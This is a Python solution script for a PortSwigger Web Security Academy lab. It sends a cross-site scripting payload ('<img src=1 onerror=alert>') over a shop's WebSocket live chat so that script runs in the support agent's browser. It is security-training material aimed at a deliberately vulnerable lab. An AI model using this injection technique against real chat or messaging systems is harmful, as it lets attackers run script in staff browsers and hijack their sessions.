#!/usr/bin/env python

'''
This online shop has a live chat feature implemented using WebSockets.
Chat messages that you submit are viewed by a support agent in real time.
To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser.

Lab Link: https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities
'''

# Code adapted from websocket-client python package documentation ("pip install websocket-client"): https://pypi.org/project/websocket-client/

import websocket
import _thread as thread
import time


lab_id = '0af800e304a7ae1e8209f39d00580053' #change based on generated lab

def on_message(ws, message):
    print(message)
    

def on_error(ws, error):
    print(error)

def on_close(ws, close_status_code, close_msg):
    print("### closed ###")

def on_open(ws): # sends xss payload then closes the connection
    print("Opened connection")
    def run(*args):
        while True:
            data = '{ "message": "<img src=1 onerror=alert(\'1\')>" }'  # Send malicious XSS payload
            ws.send(data)
            time.sleep(5) # Wait some to recive response messages from the websocket server
            ws.close()
    

    thread.start_new_thread(run, ()) # Put our actions into a thread and run it, so as not to interrupt socket transmission
    

if __name__ == "__main__":
    # websocket.enableTrace(True)  # uncomment for debug messages
    ws = websocket.WebSocketApp(f"wss://{lab_id}.web-security-academy.net/chat",
                              on_open=on_open,
                              on_message=on_message,
                              on_error=on_error,
                              on_close=on_close)

    ws.run_forever()  
